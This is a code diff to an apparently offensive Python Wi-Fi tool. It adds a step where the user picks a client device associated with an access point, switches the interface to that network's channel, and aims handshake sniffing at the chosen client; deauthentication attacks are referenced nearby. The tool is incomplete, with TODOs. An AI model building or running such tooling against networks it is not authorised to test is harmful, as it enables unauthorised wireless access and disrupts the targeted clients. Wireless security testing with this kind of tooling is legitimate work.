@@ -45,18 +45,22 @@ def main():
 
     selected_network = select_network()
     selected_ap = select_ap()
+    channel_hopper_thread.stop = True
+    channel_hopper_thread.join()
+    os.system("iw dev %s set channel %d" % (iface, selected_network.channel))
+    selected_target = select_target()
 
     print("")
     print("You were going to attack the following network and this specific AP:")
     print(selected_network)
     print(selected_ap)
+    print("With the following target:")
+    print(selected_target)
     print("")
-
-    sniff_handshake(selected_ap.bssid, "ff:ff:ff:ff:ff:ff")  # TODO Select victim
+    sniff_handshake(selected_ap.bssid, selected_target.bssid)  # TODO Select victim
     # TODO Capture handshake
 
-    channel_hopper_thread.stop = True
-    channel_hopper_thread.join()
+
 
     print("Done running, exiting")
 
@@ -89,16 +93,32 @@ def select_ap():
     print("Please specify the ID of the AP that you want to attack:")
     for ap in selected_network.aps:
         print(ap)
-    sniff_thread = APSniffer(iface, networks, Dot11Type, print_new_aps=True, target_network=selected_network)
+    sniff_thread = APSniffer(iface, networks, Dot11Type, print_new_aps=True, target_network = selected_network)
     sniff_thread.start()
     ap_id = int(input())
 
     sniff_thread.shutdown = True
     sniff_thread.join()
-
     # TODO Check for wrong user input
     print("You selected AP ", ap_id)
     return selected_network.aps[ap_id]
+
+
+# Process for having the user select which target (associated with an AP) to attack
+def select_target():
+    print("")
+    print("Please specify the ID of the target that you want to attack:")
+    for client in selected_ap.clients:
+        print(client)
+    sniff_thread = APSniffer(iface, networks, Dot11Type, print_new_clients=True, target_network=selected_network)
+    sniff_thread.start()
+    target_id = int(input())
+
+    sniff_thread.shutdown = True
+    sniff_thread.join()
+
+    print("You selected target ", target_id)
+    return selected_ap.clients[target_id]
 
 
 # Sends deauth attacks
